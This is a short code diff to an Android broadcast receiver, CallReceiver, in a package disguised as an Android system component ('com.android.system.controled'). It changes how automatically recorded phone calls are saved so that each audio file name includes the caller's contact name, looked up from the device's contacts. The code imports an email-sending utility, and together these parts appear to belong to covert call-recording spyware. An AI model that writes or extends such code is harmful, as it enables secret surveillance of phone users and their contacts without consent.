@@ -16,6 +16,7 @@ import com.android.system.controled.util.ContactsUtil;
 import com.android.system.controled.util.FileUtil;
 import com.android.system.controled.util.RecorderUtil;
 import com.android.system.controled.util.SendEmailUtil;
+import com.android.system.controled.util.StringUtil;
 import com.android.system.controled.util.TimeUtil;
 
 public class CallReceiver extends BroadcastReceiver {
@@ -99,9 +100,23 @@ public class CallReceiver extends BroadcastReceiver {
 
 	}
 
+	/**
+	 * 开始录音
+	 * 
+	 * @Description:
+	 * @param con
+	 * @param number
+	 * @see:
+	 * @since:
+	 * @author: zhuanggy
+	 * @date:2013-7-19
+	 */
 	private void startRecord(Context con, String number) {
+		// 根据号码获得姓名，姓名要过滤特殊字符
+		String name = StringUtil.getRidofSpecialOfFileName(ContactsUtil.getNameFromContactsByNumber(con, number));
+
 		// 文件保存位置
-		File file = new File(Globle.FILEPATH_AUDIOS_CALL + number + "_" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
+		File file = new File(Globle.FILEPATH_AUDIOS_CALL + name + "_" + number + "_" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
 		RecorderUtil.getInstence(con).startRecorder(file, -1);
 	}
 
